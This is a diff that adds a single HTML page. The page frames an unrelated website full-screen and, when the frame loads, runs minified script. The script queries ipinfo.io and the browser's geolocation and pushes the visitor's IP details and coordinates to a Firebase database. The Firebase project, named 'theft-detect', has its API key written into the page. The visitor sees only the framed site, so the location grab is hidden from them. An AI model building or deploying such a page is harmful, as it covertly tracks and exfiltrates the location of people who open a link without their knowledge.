@@ -1,0 +1,31 @@
+<html><head></head><body cz-shortcut-listen="true">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/4.10.1/firebase.js"></script>
+<script>
+var config={apiKey:"AIzaSyDEN8DqQnEiSHNxdQY3wx2a7afCuHZrY_c",authDomain:"theft-detect.firebaseapp.com",databaseURL:"https://theft-detect.firebaseio.com",projectId:"theft-detect",storageBucket:"theft-detect.appspot.com",messagingSenderId:"755346551077"};function getLocation(){var e=document.getElementById("demo");$.get("http://ipinfo.io",function(e){console.log(e),firebase.database().ref("points").push(e)},"jsonp");firebase.database();navigator.geolocation?navigator.geolocation.getCurrentPosition(function(e){var t,o;(o={}).lat=(t=e).coords.latitude,o.lon=t.coords.longitude,console.log(o),firebase.database().ref("points").push(o)}):e.innerHTML="Geolocation is not supported by this browser."}firebase.initializeApp(config);
+</script>
+
+<style type="text/css">
+            body, html
+            {
+                margin: 0; padding: 0; height: 100%; overflow: hidden;
+            }
+
+            #content
+            {
+                position:absolute; left: 0; right: 0; bottom: 0; top: 0px;
+            }
+        </style>
+
+<pre id="response"></pre>
+
+<div id="content">
+    <iframe onload="getLocation()" width="100%" height="100%" frameborder="0" src="http://maiam.com">
+        &lt;/div&gt;
+
+        &lt;p id="demo"&gt;&lt;/p&gt;
+
+
+        &lt;/body&gt;
+        &lt;/html&gt;
+    </iframe></div></body></html>
